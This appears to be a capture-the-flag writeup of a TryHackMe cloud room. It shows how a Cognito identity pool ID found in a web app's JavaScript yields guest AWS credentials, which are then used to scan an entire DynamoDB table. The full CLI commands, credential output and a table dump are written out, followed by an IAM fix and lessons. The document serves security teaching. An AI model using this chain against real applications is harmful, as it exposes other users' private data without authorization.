<div align="center">

# ☁️ Complimentary — TryHackMe Writeup

**Cloud Security · AWS Cognito · IAM Misconfiguration · DynamoDB Privilege Escalation**

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Complimentary-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/hh-complimentary-05e0b604)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)]()
[![Category](https://img.shields.io/badge/Category-Cloud%20%2F%20AWS-orange?style=for-the-badge&logo=amazonaws)]()
[![Day](https://img.shields.io/badge/Hacker%20Holidays-Day%203-blue?style=for-the-badge)]()

*How an over-privileged AWS guest IAM role lets anyone dump an entire database without ever logging in.*

</div>

---

## 📋 Table of Contents

- [Overview](#-overview)
- [The Story & Key Hints](#-the-story--key-hints)
- [Attack Chain Summary](#-attack-chain-summary)
- [Step 1 — Inspect the Front-End Source Code](#step-1--inspect-the-front-end-source-code)
- [Step 2 — Request an Identity ID via AWS CLI](#step-2--request-an-identity-id-via-aws-cli)
- [Step 3 — Exchange Identity ID for Temporary Credentials](#step-3--exchange-identity-id-for-temporary-credentials)
- [Step 4 — Load Credentials and Verify Identity](#step-4--load-credentials-and-verify-identity)
- [Step 5 — Dump the Database Directly](#step-5--dump-the-database-directly)
- [Root Cause](#-root-cause)
- [How to Fix It](#-how-to-fix-it)
- [Key Takeaways](#-key-takeaways)
- [Tools Used](#-tools-used)

---

## 🗺 Overview

**Complimentary** is Day 3 of TryHackMe's **Hacker Holidays 2026** event. The target is a serverless **Byte Lotus Wellness App** — no login, no account, just open and go. Behind the scenes, the app uses **AWS Cognito Identity Pools** to silently hand temporary IAM credentials to unauthenticated visitors.

The problem: the IAM role granted to guests has `dynamodb:Scan` on the entire table — not just the current user's row. By stepping outside the browser UI and hitting AWS directly with the CLI, you can read every guest's profile.

> ⚠️ **Spoiler Warning:** Full solution path shown. The flag is redacted.

---

## 📖 The Story & Key Hints

The concierge briefing set the scene clearly:

> *"Lambo installed the Byte Lotus Wellness app the day she arrived… No account needed. No login screen. It just… knows things about you the moment you open it. Something still has to be deciding what you're allowed to see — and whatever that something is, it isn't checking very carefully."*

And `@0xMia`'s story post gave the crucial nudge:

> *"something has to be quietly handing it access behind the scenes… if you find whatever that something is, don't just check what it gives YOU. ask it for more 👀"*

Both hints point to the same thing: **find the hidden auth mechanism, then push beyond what the UI exposes.**

---

## ⚡ Attack Chain Summary

```
Browser app.js → Cognito Identity Pool ID → get-id → IdentityId
      → get-credentials-for-identity → Temp AWS keys
      → export as env vars → dynamodb scan → FLAG
```

| Step | Action | Tool |
|------|--------|------|
| 1 | Find `IDENTITY_POOL_ID` in `app.js` | Browser DevTools |
| 2 | Request an `IdentityId` | `aws cognito-identity get-id` |
| 3 | Exchange for temp credentials | `aws cognito-identity get-credentials-for-identity` |
| 4 | Load creds + verify role | `export` + `aws sts get-caller-identity` |
| 5 | Scan entire DynamoDB table | `aws dynamodb scan` |

---

## Step 1 — Inspect the Front-End Source Code

Opening the wellness app in a browser showed a plain page saying data wasn't available yet. No login form — nothing obvious.

Opening **Developer Tools → Sources → `app.js`** revealed the entire backend configuration hardcoded in JavaScript:

<!-- SCREENSHOT: app.js source showing IDENTITY_POOL_ID, AWS_REGION, TABLE_NAME -->
> 📸 *[Screenshot: app.js in DevTools showing the AWS Cognito config block]*

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION       = "us-east-1";
const TABLE_NAME       = "complimentary-GuestWellnessProfiles";

AWS.config.region = AWS_REGION;
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
```

Three critical pieces of information in one place:

| Variable | Value | Why It Matters |
|----------|-------|----------------|
| `IDENTITY_POOL_ID` | `us-east-1:836c0949-…` | Used to request guest credentials |
| `AWS_REGION` | `us-east-1` | Target region for all CLI commands |
| `TABLE_NAME` | `complimentary-GuestWellnessProfiles` | The DynamoDB table to scan |

---

## Step 2 — Request an Identity ID via AWS CLI

Before AWS Cognito issues temporary credentials, it needs an **Identity ID** tied to the pool. This is the unauthenticated guest's session handle.

<!-- SCREENSHOT: Terminal showing get-id command and IdentityId output -->
> 📸 *[Screenshot: AWS CLI get-id command and JSON output with IdentityId]*

```bash
aws cognito-identity get-id \
  --region us-east-1 \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
```

**Output:**

```json
{
    "IdentityId": "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13"
}
```

> 💡 `get-id` generates a unique unauthenticated session identifier for the pool — no login required, just a public pool ID.

---

## Step 3 — Exchange Identity ID for Temporary Credentials

Passing the `IdentityId` back to Cognito returns actual temporary AWS IAM keys.

<!-- SCREENSHOT: Terminal showing get-credentials-for-identity output -->
> 📸 *[Screenshot: AWS CLI get-credentials-for-identity command returning AccessKeyId, SecretKey, SessionToken]*

```bash
aws cognito-identity get-credentials-for-identity \
  --region us-east-1 \
  --identity-id "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13"
```

**Output:**

```json
{
    "IdentityId": "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13",
    "Credentials": {
        "AccessKeyId":    "ASIAU2VYTBGYKP67ULN3",
        "SecretKey":      "s20bKrmdV3va1tC8TQUoJ1lrc11yqAXRmXwkzqMi",
        "SessionToken":   "IQoJb3JpZ2luX2VjELv...",
        "Expiration":     "2026-07-29T20:56:55+01:00"
    }
}
```

> ⚠️ These credentials are **temporary** (they expire), but they are real AWS IAM keys that can make authenticated API calls.

---

## Step 4 — Load Credentials and Verify Identity

Export the credentials as environment variables so the AWS CLI uses them for all subsequent commands:

```bash
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYKP67ULN3"
export AWS_SECRET_ACCESS_KEY="s20bKrmdV3va1tC8TQUoJ1lrc11yqAXRmXwkzqMi"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjELv..."
export AWS_DEFAULT_REGION="us-east-1"
```

Then verify which IAM role is active:

<!-- SCREENSHOT: Terminal showing sts get-caller-identity output with the cognito-unauth-role ARN -->
> 📸 *[Screenshot: aws sts get-caller-identity confirming the assumed role]*

```bash
aws sts get-caller-identity
```

**Output:**

```json
{
    "UserId":  "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
    "Account": "332173347248",
    "Arn":     "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
}
```

This confirms successful assumption of `complimentary-cognito-unauth-role` — the guest IAM role that shouldn't have broad database access, but does.

---

## Step 5 — Dump the Database Directly

Instead of using the web app's filtered UI, hit DynamoDB directly. The `dynamodb:Scan` permission on the IAM role applies to the **entire table** with no row-level restrictions:

<!-- SCREENSHOT: Terminal showing dynamodb scan command and full output with flag -->
> 📸 *[Screenshot: aws dynamodb scan returning all guest records including the flag in guest-vip-042]*

```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles
```

**Output:**

```json
{
    "Items": [
        {
            "guest_id": { "S": "guest-vibe" },
            "name":     { "S": "Vibe (Move Fast & Break Things)" },
            "email":    { "S": "vibe@hackerholidays.thm" }
        },
        {
            "guest_id": { "S": "guest-lambo" },
            "name":     { "S": "Lambo (@0xMia)" },
            "email":    { "S": "lambo@hackerholidays.thm" }
        },
        {
            "guest_id": { "S": "guest-vip-042" },
            "name":     { "S": "Guest VIP-042" },
            "notes":    { "S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{REDACTED}" }
        }
    ],
    "Count": 5,
    "ScannedCount": 5
}
```

The flag is stored in the `notes` field of `guest-vip-042`. 🎉

---

## 🔍 Root Cause

The app relied entirely on **client-side JavaScript logic** to request only the current visitor's profile. However, the IAM role it granted to guests had **unrestricted `dynamodb:Scan`** — allowing any unauthenticated user to bypass the UI and query the entire database directly from the command line.

```
Web UI filter:  SELECT * WHERE guest_id = 'you'   ← enforced only in JS
IAM permission: dynamodb:Scan on *                  ← enforced (or not) by AWS
```

The UI is not a security boundary. IAM is.

---

## 🔧 How to Fix It

Apply **Fine-Grained Access Control (FGAC)** in the IAM policy using Cognito's dynamic condition variable so DynamoDB enforces row-level isolation server-side:

```json
{
  "Effect": "Allow",
  "Action": "dynamodb:GetItem",
  "Resource": "arn:aws:dynamodb:us-east-1:*:table/complimentary-GuestWellnessProfiles",
  "Condition": {
    "ForAllValues:StringEquals": {
      "dynamodb:LeadingKeys": ["${cognito-identity.amazonaws.com:sub}"]
    }
  }
}
```

This ensures each guest can **only read their own row**, regardless of what tool they use.

---

## 🧠 Key Takeaways

| Lesson | Detail |
|--------|--------|
| **The UI is not a security boundary** | Client-side filtering can always be bypassed — enforce access in IAM |
| **Public Cognito pool IDs = public attack surface** | Anyone can call `get-id` and `get-credentials-for-identity` |
| **Always check IAM permissions directly** | The app's permissions may far exceed what the UI exposes |
| **`dynamodb:Scan` without conditions = full table read** | Use FGAC / leading key conditions for row-level isolation |
| **Read JS source code** | Hardcoded AWS config blocks are a goldmine during recon |
| **DevTools → Sources → `app.js`** | The first place to look in any serverless web app |

---

## 🛠 Tools Used

| Tool | Purpose |
|------|---------|
| **Browser DevTools** | Inspect `app.js` to find Cognito Identity Pool ID and table name |
| **AWS CLI** | `cognito-identity get-id`, `get-credentials-for-identity`, `sts get-caller-identity`, `dynamodb scan` |
| **TryHackMe** | Challenge platform |

---

<div align="center">

**Hacker Holidays 2026 — Day 3**


</div>
